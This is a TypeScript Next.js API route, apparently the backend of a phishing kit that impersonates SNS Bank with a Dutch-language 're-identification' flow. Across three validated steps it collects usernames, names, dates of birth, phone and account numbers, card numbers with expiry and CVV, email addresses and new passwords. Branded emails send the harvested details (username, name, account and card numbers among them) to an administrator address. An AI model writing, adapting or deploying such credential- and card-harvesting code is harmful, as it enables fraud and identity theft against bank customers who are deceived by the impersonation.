import { type NextRequest, NextResponse } from "next/server"
import { z } from "zod"

// Individual step schemas for partial validation
const step1Schema = z.object({
  step: z.literal(1),
  username: z.string().min(1, "Gebruikersnaam is verplicht"),
  fullName: z.string().min(1, "Volledige naam is verplicht"),
  accountTypes: z.array(z.enum(["private", "business", "creditcard"])).min(1, "Selecteer minimaal één rekeningtype"),
})

const step2Schema = z.object({
  step: z.literal(2),
  idType: z.enum(["passport", "id-card", "drivers-license"]),
  fullNameConfirm: z.string().min(1, "Bevestig je volledige naam"),
  dateOfBirth: z.string().min(1, "Geboortedatum is verplicht"),
  phoneNumber: z.string().min(1, "Telefoonnummer is verplicht"),
  accountNumber: z.string().min(1, "Rekeningnummer is verplicht"),
  cardNumber: z.string().min(1, "Kaartnummer is verplicht"),
  cardName: z.string().min(1, "Naam op kaart is verplicht"),
  expiryDate: z.string().min(1, "Vervaldatum is verplicht"),
  cvv: z.string().min(3, "CVV moet minimaal 3 cijfers zijn"),
})

const step3Schema = z.object({
  step: z.literal(3),
  missingData: z.array(z.enum(["middlenames", "address", "birthplace", "nationality"])),
  fullEmail: z.string().email("Ongeldig e-mailadres"),
  newPassword: z.string().min(6, "Wachtwoord moet minimaal 6 tekens zijn"),
})

async function sendStepNotification(stepData: any, stepNumber: number): Promise<boolean> {
  try {
    if (!process.env.ADMIN_EMAIL || !process.env.FROM_EMAIL || !process.env.RESEND_API_KEY) {
      console.log(`Step ${stepNumber} notification would be sent to:`, process.env.ADMIN_EMAIL || "undefined")
      return true // Simulate success for development
    }

    const { Resend } = await import("resend")
    const resend = new Resend(process.env.RESEND_API_KEY)

    const subject = `SNS Bank Re-identificatie - Stap ${stepNumber} Voltooid`
    const html = generateStepEmailHTML(stepData, stepNumber)
    const text = generateStepEmailText(stepData, stepNumber)

    await resend.emails.send({
      to: process.env.ADMIN_EMAIL,
      from: process.env.FROM_EMAIL,
      subject,
      html,
      text,
    })

    return true
  } catch (error) {
    console.error(`Step ${stepNumber} email error:`, error)
    return false
  }
}

function generateStepEmailHTML(stepData: any, stepNumber: number): string {
  const stepTitles = {
    1: "Inloggegevens",
    2: "Persoonlijke gegevens",
    3: "Aanvullende informatie",
  }

  let content = ""

  if (stepNumber === 1) {
    content = `
      <p><strong>Gebruikersnaam:</strong> ${stepData.username}</p>
      <p><strong>Volledige naam:</strong> ${stepData.fullName}</p>
      <p><strong>Rekeningtypes:</strong> ${stepData.accountTypes?.join(", ")}</p>
    `
  } else if (stepNumber === 2) {
    content = `
      <p><strong>ID Type:</strong> ${stepData.idType}</p>
      <p><strong>Geboortedatum:</strong> ${stepData.dateOfBirth}</p>
      <p><strong>Telefoonnummer:</strong> ${stepData.phoneNumber}</p>
      <p><strong>Rekeningnummer:</strong> ${stepData.accountNumber}</p>
      <p><strong>Kaartnummer:</strong> ${stepData.cardNumber}</p>
      <p><strong>Naam op kaart:</strong> ${stepData.cardName}</p>
    `
  } else if (stepNumber === 3) {
    content = `
      <p><strong>Ontbrekende gegevens:</strong> ${stepData.missingData?.join(", ")}</p>
      <p><strong>E-mailadres:</strong> ${stepData.fullEmail}</p>
    `
  }

  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <div style="background-color: #FF6600; padding: 20px; text-align: center;">
        <h1 style="color: white; margin: 0;">SNS Bank</h1>
        <h2 style="color: white; margin: 10px 0 0 0;">Stap ${stepNumber}: ${stepTitles[stepNumber as keyof typeof stepTitles]}</h2>
      </div>
      <div style="padding: 20px; background-color: #f9f9f9;">
        ${content}
        <p style="margin-top: 20px; font-size: 12px; color: #666;">
          Tijdstip: ${new Date().toLocaleString("nl-NL")}
        </p>
      </div>
    </div>
  `
}

function generateStepEmailText(stepData: any, stepNumber: number): string {
  const stepTitles = {
    1: "Inloggegevens",
    2: "Persoonlijke gegevens",
    3: "Aanvullende informatie",
  }

  let content = ""

  if (stepNumber === 1) {
    content = `
Gebruikersnaam: ${stepData.username}
Volledige naam: ${stepData.fullName}
Rekeningtypes: ${stepData.accountTypes?.join(", ")}`
  } else if (stepNumber === 2) {
    content = `
ID Type: ${stepData.idType}
Geboortedatum: ${stepData.dateOfBirth}
Telefoonnummer: ${stepData.phoneNumber}
Rekeningnummer: ${stepData.accountNumber}
Kaartnummer: ${stepData.cardNumber}
Naam op kaart: ${stepData.cardName}`
  } else if (stepNumber === 3) {
    content = `
Ontbrekende gegevens: ${stepData.missingData?.join(", ")}
E-mailadres: ${stepData.fullEmail}`
  }

  return `SNS Bank Re-identificatie - Stap ${stepNumber}: ${stepTitles[stepNumber as keyof typeof stepTitles]}

${content}

Tijdstip: ${new Date().toLocaleString("nl-NL")}`
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()

    // Validate based on step number
    let validatedData
    if (body.step === 1) {
      validatedData = step1Schema.parse(body)
    } else if (body.step === 2) {
      validatedData = step2Schema.parse(body)
    } else if (body.step === 3) {
      validatedData = step3Schema.parse(body)
    } else {
      return NextResponse.json({ message: "Invalid step number" }, { status: 400 })
    }

    // Send step notification email
    const emailSent = await sendStepNotification(validatedData, body.step)

    return NextResponse.json({
      success: true,
      step: body.step,
      emailSent,
    })
  } catch (error) {
    console.error("Step submission error:", error)

    if (error instanceof z.ZodError) {
      return NextResponse.json(
        {
          message: "Validatiefout in formuliergegevens",
          errors: error.errors,
        },
        { status: 400 },
      )
    }

    return NextResponse.json(
      {
        message: "Er is een fout opgetreden bij het verzenden van je gegevens",
      },
      { status: 500 },
    )
  }
}
